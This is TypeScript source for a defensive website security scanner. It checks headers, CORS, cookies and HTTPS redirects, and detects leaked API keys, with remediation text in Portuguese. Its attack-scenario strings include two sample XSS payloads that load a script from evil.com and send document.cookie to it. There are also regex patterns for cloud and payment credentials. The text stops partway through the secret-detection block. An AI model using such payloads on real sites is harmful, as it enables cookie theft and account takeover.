/**
 * DevGuard HTTP Analyzer v3.1
 *
 * Filosofia: zero falsos positivos + relatório DETALHADO e ACIONÁVEL.
 *
 * Cada vulnerabilidade reportada inclui:
 *   - Localização exata (URL, header, cookie, etc.)
 *   - Cenário de ataque concreto
 *   - Como corrigir em múltiplos stacks (nginx, Apache, Express, Next.js, PHP)
 *   - Como verificar a correção (curl)
 *   - Referência (CWE/OWASP)
 */

interface VulnRaw {
  title: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  description: string;
  solution: string;
}

const MAX_BODY_BYTES = 2 * 1024 * 1024; // 2 MB

async function readBodyLimited(res: Response, maxBytes = MAX_BODY_BYTES): Promise<string> {
  if (!res.body) return '';
  const reader = res.body.getReader();
  const chunks: Uint8Array[] = [];
  let total = 0;
  while (total < maxBytes) {
    const { done, value } = await reader.read();
    if (done) break;
    if (!value) continue;
    const remaining = maxBytes - total;
    if (value.byteLength > remaining) {
      chunks.push(value.slice(0, remaining));
      total += remaining;
      try { await reader.cancel(); } catch { /* ignore */ }
      break;
    }
    chunks.push(value);
    total += value.byteLength;
  }
  const merged = new Uint8Array(total);
  let offset = 0;
  for (const c of chunks) { merged.set(c, offset); offset += c.byteLength; }
  return new TextDecoder('utf-8', { fatal: false }).decode(merged);
}

function stripCommentsAndStrings(html: string): string {
  return html
    .replace(/<!--[\s\S]*?-->/g, '')
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/^\s*\/\/.*$/gm, '');
}

function looksLikePlaceholder(value: string): boolean {
  const lower = value.toLowerCase();
  const placeholderWords = [
    'example', 'exemplo', 'placeholder', 'your_', 'your-', 'sample', 'mock', 'dummy',
    'test123', 'password123', 'senha123', 'xxxxx', '123456', 'abcdef', 'changeme',
    '<your', '{your', 'insert_', 'replace_', 'todo', 'fixme', 'lorem',
  ];
  if (placeholderWords.some(w => lower.includes(w))) return true;
  if (new Set(value).size < 4) return true;
  return false;
}

function shannonEntropy(s: string): number {
  if (!s) return 0;
  const freq: Record<string, number> = {};
  for (const ch of s) freq[ch] = (freq[ch] || 0) + 1;
  let entropy = 0;
  const len = s.length;
  for (const ch in freq) {
    const p = freq[ch] / len;
    entropy -= p * Math.log2(p);
  }
  return entropy;
}

function getFrameAncestors(csp: string | null): string | null {
  if (!csp) return null;
  const match = csp.match(/frame-ancestors\s+([^;]+)/i);
  return match ? match[1].trim() : null;
}

export class SiteUnreachableError extends Error {
  constructor(public readonly url: string, public readonly cause: string) {
    super(`Site unreachable: ${url} (${cause})`);
    this.name = 'SiteUnreachableError';
  }
}

export class HttpAnalyzerService {
  async analyze(url: string): Promise<VulnRaw[]> {
    const vulns: VulnRaw[] = [];
    let response: Response;

    try {
      console.log(`[HTTP] Analyzing ${url}...`);
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 15000);
      response = await fetch(url, {
        method: 'GET',
        redirect: 'follow',
        signal: controller.signal,
        headers: { 'User-Agent': 'DevGuardBot/3.1 (+https://devguardia.cloud/bot)' },
      });
      clearTimeout(timeout);
    } catch (err: any) {
      console.error(`[HTTP] Site unreachable: ${url} — ${err.message || err}`);
      throw new SiteUnreachableError(url, err.message || String(err));
    }

    const headers = response.headers;
    const finalUrl = response.url;
    const isHttps = finalUrl.startsWith('https://');
    const origin = new URL(finalUrl).origin;

    console.log(`[HTTP] Response: ${response.status} from ${finalUrl}`);

    // ═══════════════════════════════════════════════════════════════════════
    // 1. HTTPS Check
    // ═══════════════════════════════════════════════════════════════════════
    if (!isHttps) {
      vulns.push({
        title: 'Site não usa HTTPS',
        severity: 'HIGH',
        description: [
          `Localização: ${finalUrl}`,
          ``,
          `O site está sendo servido via HTTP (sem criptografia TLS/SSL). Toda comunicação entre o navegador e o servidor — incluindo senhas, cookies de sessão e dados pessoais — trafega em texto puro.`,
          ``,
          `Cenário de ataque: um atacante na mesma rede Wi-Fi pública (cafeteria, aeroporto) pode usar Wireshark ou Bettercap para interceptar credenciais e sequestrar sessões em segundos.`,
          ``,
          `Referência: OWASP Top 10 A02:2021 — Cryptographic Failures | CWE-319`,
        ].join('\n'),
        solution: [
          `Como corrigir:`,
          ``,
          `1) Obtenha um certificado SSL gratuito via Let's Encrypt (com Certbot):`,
          `   sudo certbot --nginx -d seudominio.com -d www.seudominio.com`,
          ``,
          `2) Configure redirect 301 de HTTP para HTTPS no servidor:`,
          ``,
          `   nginx:`,
          `     server {`,
          `       listen 80;`,
          `       server_name seudominio.com;`,
          `       return 301 https://$host$request_uri;`,
          `     }`,
          ``,
          `   Apache (.htaccess):`,
          `     RewriteEngine On`,
          `     RewriteCond %{HTTPS} off`,
          `     RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]`,
          ``,
          `   Cloudflare: ative "Always Use HTTPS" em SSL/TLS → Edge Certificates.`,
          ``,
          `3) Verificar correção:`,
          `   curl -I http://seudominio.com   # deve retornar 301 + Location: https://...`,
        ].join('\n'),
      });
    }

    // ═══════════════════════════════════════════════════════════════════════
    // 2. Security Headers
    // ═══════════════════════════════════════════════════════════════════════
    const csp = headers.get('content-security-policy');
    const frameAncestors = getFrameAncestors(csp);

    // HSTS
    if (isHttps && !headers.get('strict-transport-security')) {
      vulns.push({
        title: 'Header HSTS ausente',
        severity: 'MEDIUM',
        description: [
          `Localização: header HTTP de resposta em ${finalUrl}`,
          ``,
          `O header Strict-Transport-Security (HSTS) não está presente. Sem HSTS, um atacante pode forçar o navegador a usar HTTP (downgrade attack) — por exemplo, interceptando o primeiro request quando o usuário digita "seudominio.com" sem "https://".`,
          ``,
          `Cenário de ataque: ferramenta SSLstrip em redes Wi-Fi públicas reescreve links HTTPS para HTTP em tempo real. Sem HSTS, o navegador aceita.`,
          ``,
          `Referência: OWASP Top 10 A05:2021 — Security Misconfiguration | CWE-319`,
        ].join('\n'),
        solution: [
          `Como corrigir:`,
          ``,
          `Adicione o header em todas as respostas HTTPS:`,
          `   Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`,
          ``,
          `Por stack:`,
          ``,
          `   nginx (dentro do server { } HTTPS):`,
          `     add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;`,
          ``,
          `   Apache:`,
          `     Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"`,
          ``,
          `   Express.js:`,
          `     app.use(helmet.hsts({ maxAge: 63072000, includeSubDomains: true, preload: true }));`,
          ``,
          `   Next.js (next.config.js → headers()):`,
          `     { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' }`,
          ``,
          `Após estabilizar, submeta ao preload list: https://hstspreload.org`,
          ``,
          `Verificar:`,
          `   curl -I https://seudominio.com | grep -i strict-transport-security`,
        ].join('\n'),
      });
    }

    // X-Content-Type-Options
    if (!headers.get('x-content-type-options')) {
      vulns.push({
        title: 'X-Content-Type-Options ausente',
        severity: 'LOW',
        description: [
          `Localização: header HTTP de resposta em ${finalUrl}`,
          ``,
          `Sem o header "X-Content-Type-Options: nosniff", browsers antigos podem fazer MIME sniffing — interpretando um arquivo .txt malicioso como HTML/JS, por exemplo. Isso permite XSS via uploads de usuários.`,
          ``,
          `Referência: CWE-430 | MDN: X-Content-Type-Options`,
        ].join('\n'),
        solution: [
          `Como corrigir:`,
          ``,
          `Adicione em todas as respostas:`,
          `   X-Content-Type-Options: nosniff`,
          ``,
          `   nginx:    add_header X-Content-Type-Options "nosniff" always;`,
          `   Apache:   Header always set X-Content-Type-Options "nosniff"`,
          `   Express:  app.use(helmet.noSniff()); // ou helmet padrão`,
          `   Next.js:  { key: 'X-Content-Type-Options', value: 'nosniff' }`,
          ``,
          `Verificar:`,
          `   curl -I https://seudominio.com | grep -i x-content-type-options`,
        ].join('\n'),
      });
    }

    // X-Frame-Options / frame-ancestors
    if (!headers.get('x-frame-options') && !frameAncestors) {
      vulns.push({
        title: 'Proteção contra clickjacking ausente',
        severity: 'MEDIUM',
        description: [
          `Localização: header HTTP de resposta em ${finalUrl}`,
          ``,
          `Nem "X-Frame-Options" nem CSP "frame-ancestors" estão configurados. O site pode ser embutido em <iframe> em qualquer página externa.`,
          ``,
          `Cenário de ataque (clickjacking): um atacante embute seu site em um iframe transparente sobre uma página falsa. O usuário pensa que está clicando num botão inocente, mas na verdade está clicando em "Transferir saldo" ou "Excluir conta" no seu site (com a sessão logada).`,
          ``,
          `Referência: OWASP Top 10 A05:2021 | CWE-1021`,
        ].join('\n'),
        solution: [
          `Como corrigir:`,
          ``,
          `Use CSP frame-ancestors (preferível) OU X-Frame-Options:`,
          ``,
          `   nginx:`,
          `     add_header Content-Security-Policy "frame-ancestors 'none'" always;`,
          `     # ou X-Frame-Options para legado:`,
          `     add_header X-Frame-Options "DENY" always;`,
          ``,
          `   Apache:`,
          `     Header always set Content-Security-Policy "frame-ancestors 'none'"`,
          `     Header always set X-Frame-Options "DENY"`,
          ``,
          `   Express:`,
          `     app.use(helmet.frameguard({ action: 'deny' }));`,
          ``,
          `   Next.js (next.config.js):`,
          `     { key: 'X-Frame-Options', value: 'DENY' }`,
          `     { key: 'Content-Security-Policy', value: "frame-ancestors 'none'" }`,
          ``,
          `Use SAMEORIGIN se precisar embutir o próprio site em iframes.`,
          ``,
          `Verificar:`,
          `   curl -I https://seudominio.com | grep -iE 'x-frame-options|frame-ancestors'`,
        ].join('\n'),
      });
    }

    // CSP
    if (!csp) {
      vulns.push({
        title: 'Content-Security-Policy ausente',
        severity: 'MEDIUM',
        description: [
          `Localização: header HTTP de resposta em ${finalUrl}`,
          ``,
          `O header "Content-Security-Policy" não está configurado. CSP é a principal defesa em profundidade contra XSS — sem ele, qualquer script injetado executa sem restrição de origem.`,
          ``,
          `Cenário de ataque: se o site tem qualquer falha de XSS (ex: campo de comentário sem sanitização), o atacante injeta <script src="https://evil.com/steal.js"></script> e exfiltra cookies de todos os usuários. Com CSP bloqueando origens externas, o ataque falha.`,
          ``,
          `Referência: OWASP Top 10 A03:2021 — Injection | CWE-1173`,
        ].join('\n'),
        solution: [
          `Como corrigir:`,
          ``,
          `Comece com uma policy restritiva e ajuste conforme erros aparecem no console:`,
          ``,
          `   Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; object-src 'none'; base-uri 'self'; frame-ancestors 'none'`,
          ``,
          `Por stack:`,
          ``,
          `   nginx:`,
          `     add_header Content-Security-Policy "default-src 'self'; object-src 'none'; frame-ancestors 'none'" always;`,
          ``,
          `   Express:`,
          `     app.use(helmet.contentSecurityPolicy({`,
          `       directives: {`,
          `         defaultSrc: ["'self'"],`,
          `         scriptSrc: ["'self'"],`,
          `         objectSrc: ["'none'"],`,
          `         frameAncestors: ["'none'"],`,
          `       },`,
          `     }));`,
          ``,
          `   Next.js: defina em next.config.js → headers().`,
          ``,
          `Estratégia recomendada:`,
          `   1. Comece em modo report-only: Content-Security-Policy-Report-Only`,
          `   2. Configure um endpoint de relatório`,
          `   3. Após dias/semanas sem violações legítimas, mude para enforcing`,
          ``,
          `Ferramenta para gerar CSP: https://csp-evaluator.withgoogle.com`,
        ].join('\n'),
      });
    }

    // Referrer-Policy (INFO)
    if (!headers.get('referrer-policy')) {
      vulns.push({
        title: 'Referrer-Policy não definido explicitamente',
        severity: 'INFO',
        description: [
          `Localização: header HTTP de resposta em ${finalUrl}`,
          ``,
          `Browsers modernos (Chrome 85+, Firefox 87+, Safari 14.5+) usam "strict-origin-when-cross-origin" como padrão, então o impacto real é pequeno. Definir explicitamente garante comportamento consistente em browsers antigos e em proxies/CDNs intermediários.`,
          ``,
          `Sem essa config, URLs internas com tokens (ex: /reset-password?token=abc123) podem vazar como Referer para sites externos quando o usuário clica em links.`,
          ``,
          `Referência: MDN: Referrer-Policy`,
        ].join('\n'),
        solution: [
          `Como corrigir:`,
          ``,
          `   Referrer-Policy: strict-origin-when-cross-origin`,
          ``,
          `   nginx:    add_header Referrer-Policy "strict-origin-when-cross-origin" always;`,
          `   Apache:   Header always set Referrer-Policy "strict-origin-when-cross-origin"`,
          `   Express:  app.use(helmet.referrerPolicy({ policy: 'strict-origin-when-cross-origin' }));`,
          ``,
          `Para sites com dados altamente sensíveis (saúde, finanças), considere "no-referrer".`,
        ].join('\n'),
      });
    }

    // ═══════════════════════════════════════════════════════════════════════
    // 3. Information Disclosure
    // ═══════════════════════════════════════════════════════════════════════
    const serverHeader = headers.get('server');
    if (serverHeader && /(apache|nginx|iis|openssl|php|express|tomcat|lighttpd|caddy)[\/ ][\d.]+/i.test(serverHeader)) {
      vulns.push({
        title: 'Versão do servidor exposta no header Server',
        severity: 'INFO',
        description: [
          `Localização: header "Server: ${serverHeader}" em ${finalUrl}`,
          ``,
          `O header revela a versão exata do software. Não é exploit direto, mas facilita reconhecimento — atacante automatizado pesquisa CVEs específicas para a versão antes de tentar ataque.`,
          ``,
          `Referência: CWE-200 | OWASP — Information Disclosure`,
        ].join('\n'),
        solution: [
          `Como corrigir:`,
          ``,
          `   nginx (no http { } ou server { }):`,
          `     server_tokens off;`,
          ``,
          `   Apache (httpd.conf):`,
          `     ServerTokens Prod`,
          `     ServerSignature Off`,
          ``,
          `   Express:`,
          `     app.disable('x-powered-by');`,
          `     // Para remover Server: use middleware ou proxy reverso`,
          ``,
          `   Para esconder completamente, use proxy reverso (Cloudflare, nginx) que sobrescreve o header.`,
          ``,
          `Verificar:`,
          `   curl -I https://seudominio.com | grep -i server`,
        ].join('\n'),
      });
    }

    const poweredBy = headers.get('x-powered-by');
    if (poweredBy && /[\d.]+/.test(poweredBy)) {
      vulns.push({
        title: 'X-Powered-By revela tecnologia/versão',
        severity: 'INFO',
        description: [
          `Localização: header "X-Powered-By: ${poweredBy}" em ${finalUrl}`,
          ``,
          `O header revela a stack/versão. Não é exploit direto, mas facilita reconhecimento.`,
          ``,
          `Referência: CWE-200`,
        ].join('\n'),
        solution: [
          `Como corrigir:`,
          ``,
          `   Express.js:        app.disable('x-powered-by');`,
          `   PHP (php.ini):     expose_php = Off`,
          `   ASP.NET (web.config):`,
          `     <httpProtocol>`,
          `       <customHeaders>`,
          `         <remove name="X-Powered-By" />`,
          `       </customHeaders>`,
          `     </httpProtocol>`,
          `   nginx (proxy):     proxy_hide_header X-Powered-By;`,
        ].join('\n'),
      });
    }

    // ═══════════════════════════════════════════════════════════════════════
    // 4. CORS
    // ═══════════════════════════════════════════════════════════════════════
    const corsHeader = headers.get('access-control-allow-origin');
    if (corsHeader === '*') {
      const allowsCreds = headers.get('access-control-allow-credentials')?.toLowerCase() === 'true';
      if (allowsCreds) {
        vulns.push({
          title: 'CORS mal configurado: wildcard + credentials',
          severity: 'CRITICAL',
          description: [
            `Localização: headers de resposta em ${finalUrl}`,
            `   Access-Control-Allow-Origin: *`,
            `   Access-Control-Allow-Credentials: true`,
            ``,
            `Essa combinação é INVÁLIDA pela spec CORS — browsers rejeitam, mas a presença indica que o backend está mal configurado e provavelmente tem outras falhas relacionadas.`,
            ``,
            `Cenário de ataque: se o backend ignora a validação de Origin em alguns endpoints (comum em código mal feito), atacante de origem maliciosa pode fazer requests autenticados em nome do usuário e ler respostas.`,
            ``,
            `Referência: OWASP — CORS Misconfiguration | CWE-942`,
          ].join('\n'),
          solution: [
            `Como corrigir:`,
            ``,
            `Liste origens permitidas explicitamente — NUNCA use wildcard com credentials:`,
            ``,
            `   Express (cors lib):`,
            `     const allowedOrigins = ['https://app.seudominio.com', 'https://admin.seudominio.com'];`,
            `     app.use(cors({`,
            `       origin: (origin, cb) => {`,
            `         if (!origin || allowedOrigins.includes(origin)) cb(null, origin);`,
            `         else cb(new Error('Not allowed by CORS'));`,
            `       },`,
            `       credentials: true,`,
            `     }));`,
            ``,
            `   NestJS:`,
            `     app.enableCors({`,
            `       origin: ['https://app.seudominio.com'],`,
            `       credentials: true,`,
            `     });`,
            ``,
            `Verificar:`,
            `   curl -I -H "Origin: https://malicioso.com" https://api.seudominio.com/endpoint`,
            `   # Access-Control-Allow-Origin NÃO deve aparecer ou ser igual a um origin permitido`,
          ].join('\n'),
        });
      } else {
        vulns.push({
          title: 'CORS permite qualquer origem (wildcard)',
          severity: 'MEDIUM',
          description: [
            `Localização: header "Access-Control-Allow-Origin: *" em ${finalUrl}`,
            ``,
            `Wildcard é aceitável para APIs públicas verdadeiramente sem dados sensíveis (ex: API de cotação de moedas, dados públicos). Para endpoints autenticados ou com qualquer dado privado, é configuração inadequada.`,
            ``,
            `Cenário de ataque: se este endpoint serve dados que dependem de IP do cliente (rate-limit por IP, dados regionais) ou expõe informação que deveria ser privada, atacantes em qualquer origem podem coletá-los em massa.`,
            ``,
            `Referência: OWASP — CORS Misconfiguration | CWE-942`,
          ].join('\n'),
          solution: [
            `Como corrigir:`,
            ``,
            `Para APIs autenticadas, restrinja a origens conhecidas:`,
            ``,
            `   nginx:`,
            `     map $http_origin $cors_origin {`,
            `       default "";`,
            `       "https://app.seudominio.com" $http_origin;`,
            `     }`,
            `     add_header Access-Control-Allow-Origin $cors_origin always;`,
            ``,
            `   Express:`,
            `     app.use(cors({ origin: 'https://app.seudominio.com' }));`,
            ``,
            `Para APIs verdadeiramente públicas: mantenha "*" mas garanta que NÃO há credentials e NÃO há rate-limit por IP que possa ser bypassado.`,
          ].join('\n'),
        });
      }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // 5. Cookie Security
    // ═══════════════════════════════════════════════════════════════════════
    const setCookieList: string[] =
      typeof (headers as any).getSetCookie === 'function'
        ? (headers as any).getSetCookie()
        : (headers.get('set-cookie') ? [headers.get('set-cookie')!] : []);

    const sessionCookieRegex = /^(session|sess|sid|auth|token|jwt|connect\.sid|phpsessid|jsessionid|asp\.?net_sessionid|laravel_session|_session|__secure-|__host-)/i;
    const sessionCookiesNoSecure: string[] = [];
    const otherCookiesNoSecure: string[] = [];
    const sessionCookiesNoHttpOnly: string[] = [];
    const sessionCookiesNoSameSite: string[] = [];

    for (const raw of setCookieList) {
      const name = raw.split('=')[0]?.trim() || '';
      const isSessionLike = sessionCookieRegex.test(name);
      const lower = raw.toLowerCase();
      const hasSecure = /;\s*secure(\s*;|\s*$)/i.test(raw);
      const hasHttpOnly = /;\s*httponly(\s*;|\s*$)/i.test(raw);
      const hasSameSite = /;\s*samesite=/i.test(lower);

      if (isHttps && !hasSecure) {
        if (isSessionLike) sessionCookiesNoSecure.push(name);
        else otherCookiesNoSecure.push(name);
      }
      if (isSessionLike && !hasHttpOnly) sessionCookiesNoHttpOnly.push(name);
      if (isSessionLike && !hasSameSite) sessionCookiesNoSameSite.push(name);
    }

    if (sessionCookiesNoSecure.length > 0) {
      vulns.push({
        title: 'Cookie de sessão sem flag Secure em HTTPS',
        severity: 'MEDIUM',
        description: [
          `Localização: header Set-Cookie em ${finalUrl}`,
          `Cookies afetados: ${sessionCookiesNoSecure.join(', ')}`,
          ``,
          `Cookies de sessão sem a flag "Secure" podem ser transmitidos por HTTP em cenários de downgrade. Atacante em rede hostil força um sub-request HTTP (ex: imagem com src="http://...") e captura o cookie.`,
          ``,
          `Cenário de ataque: vítima usa Wi-Fi pública. Atacante injeta um <img src="http://seudominio.com/x"> em qualquer site HTTP. O navegador envia o cookie de sessão na requisição HTTP em texto puro.`,
          ``,
          `Referência: OWASP — Cookie Security | CWE-614`,
        ].join('\n'),
        solution: [
          `Como corrigir:`,
          ``,
          `Adicione Secure (e idealmente HttpOnly + SameSite):`,
          `   Set-Cookie: ${sessionCookiesNoSecure[0]}=valor; Secure; HttpOnly; SameSite=Lax; Path=/`,
          ``,
          `Por stack:`,
          ``,
          `   Express (express-session):`,
          `     app.use(session({`,
          `       secret: process.env.SESSION_SECRET,`,
          `       cookie: { secure: true, httpOnly: true, sameSite: 'lax' },`,
          `     }));`,
          ``,
          `   PHP (php.ini ou ini_set):`,
          `     session.cookie_secure = 1`,
          `     session.cookie_httponly = 1`,
          `     session.cookie_samesite = "Lax"`,
          ``,
          `   Next.js (cookies API):`,
          `     cookies().set('session', token, { secure: true, httpOnly: true, sameSite: 'lax', path: '/' });`,
          ``,
          `Verificar:`,
          `   curl -I https://seudominio.com | grep -i set-cookie`,
        ].join('\n'),
      });
    }
    if (otherCookiesNoSecure.length > 0) {
      vulns.push({
        title: 'Cookies não-sensíveis sem flag Secure',
        severity: 'LOW',
        description: [
          `Localização: header Set-Cookie em ${finalUrl}`,
          `Cookies afetados: ${otherCookiesNoSecure.join(', ')}`,
          ``,
          `Estes cookies não parecem ser de sessão (não correspondem a padrões como "session", "auth", "token"). O risco é baixo se não contêm dados sensíveis. Ainda assim, em sites HTTPS é boa prática usar Secure por padrão em todos os cookies.`,
          ``,
          `Referência: OWASP — Cookie Security`,
        ].join('\n'),
        solution: [
          `Como corrigir:`,
          ``,
          `Adicione Secure por padrão a todos os cookies em HTTPS:`,
          `   Set-Cookie: ${otherCookiesNoSecure[0]}=valor; Secure; SameSite=Lax`,
          ``,
          `Se o cookie precisa ser legível por JavaScript (ex: tema, idioma), mantenha SEM HttpOnly mas COM Secure.`,
        ].join('\n'),
      });
    }
    if (sessionCookiesNoHttpOnly.length > 0) {
      vulns.push({
        title: 'Cookie de sessão sem flag HttpOnly',
        severity: 'MEDIUM',
        description: [
          `Localização: header Set-Cookie em ${finalUrl}`,
          `Cookies afetados: ${sessionCookiesNoHttpOnly.join(', ')}`,
          ``,
          `Cookies de sessão sem HttpOnly são acessíveis via document.cookie em JavaScript. Se o site tem qualquer XSS, o cookie é roubado em milissegundos.`,
          ``,
          `Cenário de ataque: atacante encontra um campo vulnerável a XSS (ex: comentário, perfil) e injeta: <script>fetch("https://evil.com?c="+document.cookie)</script>. Sem HttpOnly, todos os usuários que visualizam aquele conteúdo têm sessão roubada.`,
          ``,
          `Referência: OWASP Top 10 A07:2021 — Identification Failures | CWE-1004`,
        ].join('\n'),
        solution: [
          `Como corrigir:`,
          ``,
          `Adicione HttpOnly em cookies de sessão/auth:`,
          `   Set-Cookie: ${sessionCookiesNoHttpOnly[0]}=valor; HttpOnly; Secure; SameSite=Lax; Path=/`,
          ``,
          `   Express:  cookie: { httpOnly: true, secure: true, sameSite: 'lax' }`,
          `   PHP:      session.cookie_httponly = 1`,
          `   Next.js:  cookies().set(name, value, { httpOnly: true, ... })`,
          ``,
          `IMPORTANTE: cookies que precisam ser lidos no client (ex: CSRF token tipo double-submit) NÃO devem ter HttpOnly — só os de sessão/auth.`,
        ].join('\n'),
      });
    }
    if (sessionCookiesNoSameSite.length > 0) {
      vulns.push({
        title: 'Cookie de sessão sem atributo SameSite',
        severity: 'LOW',
        description: [
          `Localização: header Set-Cookie em ${finalUrl}`,
          `Cookies afetados: ${sessionCookiesNoSameSite.join(', ')}`,
          ``,
          `Browsers modernos default para SameSite=Lax, mas explicitar é melhor — alguns browsers antigos e versões de Chrome anteriores a 80 ainda usam "None" implícito, deixando o site vulnerável a CSRF.`,
          ``,
          `Referência: OWASP — CSRF Prevention | MDN: SameSite cookies`,
        ].join('\n'),
        solution: [
          `Como corrigir:`,
          ``,
          `Adicione SameSite=Lax (ou Strict para máxima proteção):`,
          `   Set-Cookie: ${sessionCookiesNoSameSite[0]}=valor; HttpOnly; Secure; SameSite=Lax`,
          ``,
          `Diferença:`,
          `   - Lax:    cookie enviado em navegação top-level (clicks). Bom default.`,
          `   - Strict: cookie nunca enviado cross-site. Mais seguro mas quebra fluxos OAuth/SSO.`,
          `   - None:   cookie enviado sempre (requer Secure). Use só para integrações cross-site explícitas.`,
        ].join('\n'),
      });
    }

    // ═══════════════════════════════════════════════════════════════════════
    // 6. HTTP→HTTPS Redirect
    // ═══════════════════════════════════════════════════════════════════════
    const hsts = headers.get('strict-transport-security') || '';
    const hasHstsPreload = /preload/i.test(hsts) && /max-age=\s*\d{7,}/i.test(hsts);

    if (isHttps && !hasHstsPreload) {
      try {
        const httpUrl = url.replace(/^https:\/\//, 'http://');
        if (httpUrl !== url) {
          const httpController = new AbortController();
          const httpTimeout = setTimeout(() => httpController.abort(), 5000);
          const httpResp = await fetch(httpUrl, {
            method: 'HEAD',
            redirect: 'manual',
            signal: httpController.signal,
            headers: { 'User-Agent': 'DevGuardBot/3.1' },
          });
          clearTimeout(httpTimeout);
          const location = httpResp.headers.get('location') || '';
          const isRedirect = httpResp.status >= 300 && httpResp.status < 400;
          const redirectsToHttps = location.startsWith('https://') || (location.startsWith('/') && isHttps);
          if ((httpResp.status >= 200 && httpResp.status < 300) || (isRedirect && !redirectsToHttps && location.startsWith('http://'))) {
            vulns.push({
              title: 'HTTP não redireciona para HTTPS',
              severity: 'MEDIUM',
              description: [
                `Localização: ${httpUrl}`,
                `Status retornado: ${httpResp.status}${location ? `, Location: ${location}` : ''}`,
                ``,
                `Acessar o site via HTTP retorna conteúdo direto (ou redireciona para outra URL HTTP). O primeiro request de qualquer usuário que digita "seudominio.com" sem "https://" pode ser interceptado.`,
                ``,
                `Cenário de ataque: SSLstrip em redes Wi-Fi públicas mantém a conexão HTTP entre vítima e atacante, e HTTPS entre atacante e seu servidor — vítima vê site funcionando "normalmente" mas todo tráfego é interceptado.`,
                ``,
                `Referência: CWE-319`,
              ].join('\n'),
              solution: [
                `Como corrigir:`,
                ``,
                `1) Configure redirect 301 de HTTP para HTTPS:`,
                ``,
                `   nginx:`,
                `     server {`,
                `       listen 80;`,
                `       server_name seudominio.com www.seudominio.com;`,
                `       return 301 https://$host$request_uri;`,
                `     }`,
                ``,
                `   Apache:`,
                `     <VirtualHost *:80>`,
                `       ServerName seudominio.com`,
                `       Redirect permanent / https://seudominio.com/`,
                `     </VirtualHost>`,
                ``,
                `   Cloudflare: SSL/TLS → Edge Certificates → "Always Use HTTPS" ON.`,
                ``,
                `2) Habilite HSTS (ver vulnerabilidade "Header HSTS ausente").`,
                ``,
                `3) Após estabilizar, considere submeter ao HSTS Preload List (https://hstspreload.org).`,
                ``,
                `Verificar:`,
                `   curl -I http://seudominio.com   # deve retornar 301 + Location: https://...`,
              ].join('\n'),
            });
          }
        }
      } catch { /* HTTP inacessível é o comportamento correto */ }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // 7. COOP (INFO em HTTPS)
    // ═══════════════════════════════════════════════════════════════════════
    if (isHttps && !headers.get('cross-origin-opener-policy')) {
      vulns.push({
        title: 'Cross-Origin-Opener-Policy não definido',
        severity: 'INFO',
        description: [
          `Localização: header HTTP de resposta em ${finalUrl}`,
          ``,
          `COOP isola o browsing context contra ataques cross-window (Spectre, XS-Leaks). Relevante para sites com OAuth/popups ou que querem habilitar SharedArrayBuffer. Não é vulnerabilidade direta para sites simples.`,
          ``,
          `Referência: MDN: Cross-Origin-Opener-Policy`,
        ].join('\n'),
        solution: [
          `Como corrigir:`,
          ``,
          `   Cross-Origin-Opener-Policy: same-origin-allow-popups`,
          ``,
          `   nginx:    add_header Cross-Origin-Opener-Policy "same-origin-allow-popups" always;`,
          `   Express:  app.use(helmet.crossOriginOpenerPolicy({ policy: 'same-origin-allow-popups' }));`,
          ``,
          `Use "same-origin" para máximo isolamento (necessário para SharedArrayBuffer/WebAssembly threads).`,
        ].join('\n'),
      });
    }

    // ═══════════════════════════════════════════════════════════════════════
    // 8. Body Content Analysis (credenciais expostas)
    // ═══════════════════════════════════════════════════════════════════════
    const rawBody = await readBodyLimited(response);
    const body = stripCommentsAndStrings(rawBody);

    const highConfidencePatterns = [
      { pattern: /sk_live_[a-zA-Z0-9]{24,}/g, title: 'Chave Stripe LIVE exposta no HTML', severity: 'CRITICAL' as const, vendor: 'Stripe', rotateUrl: 'https://dashboard.stripe.com/apikeys' },
      { pattern: /sk_test_[a-zA-Z0-9]{24,}/g, title: 'Chave Stripe TEST exposta no HTML', severity: 'HIGH' as const, vendor: 'Stripe', rotateUrl: 'https://dashboard.stripe.com/test/apikeys' },
      { pattern: /(?:AKIA|ASIA)[A-Z0-9]{16}/g, title: 'AWS Access Key exposta no HTML', severity: 'CRITICAL' as const, vendor: 'AWS', rotateUrl: 'https://console.aws.amazon.com/iam/home#/security_credentials' },
      { pattern: /-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----/g, title: 'Chave privada exposta no HTML', severity: 'CRITICAL' as const, vendor: '', rotateUrl: '' },
      { pattern: /(?:mongodb(?:\+srv)?|postgresql|mysql|redis):\/\/[^:\s"'<>]+:[^@\s"'<>]+@[^\s"'<>]+/g, title: 'String de conexão de banco com credenciais exposta', severity: 'CRITICAL' as const, vendor: '', rotateUrl: '' },
      { pattern: /ghp_[a-zA-Z0-9]{36,}/g, title: 'GitHub Personal Access Token exposto', severity: 'CRITICAL' as const, vendor: 'GitHub', rotateUrl: 'https://github.com/settings/tokens' },
      { pattern: /github_pat_[a-zA-Z0-9_]{82}/g, title: 'GitHub Fine-grained PAT exposto', severity: 'CRITICAL' as const, vendor: 'GitHub', rotateUrl: 'https://github.com/settings/tokens' },
      { pattern: /xox[baprs]-[a-zA-Z0-9-]{10,}/g, title: 'Slack token exposto', severity: 'HIGH' as const, vendor: 'Slack', rotateUrl: 'https://api.slack.com/apps' },
      { pattern: /AIza[0-9A-Za-z_-]{35}/g, title: 'Google API Key exposta', severity: 'HIGH' as const, vendor: 'Google Cloud', rotateUrl: 'https://console.cloud.google.com/apis/credentials' },
    ];

    for (const { pattern, title, severity, vendor, rotateUrl } of highConfidencePatterns) {
      const matches = body.match(pattern);
      const realMatches = matches?.filter(m => !looksLikePlaceholder(m)) || [];
      if (realMatches.length > 0) {
        const masked = realMatches.map(m => m.slice(0, 10) + '***' + m.slice(-4)).join(', ');
        vulns.push({
          title,
          severity,
          description: [
            `Localização: corpo HTML retornado por ${finalUrl}`,
            `Ocorrências: ${realMatches.length} (mascaradas: ${masked})`,
            ``,
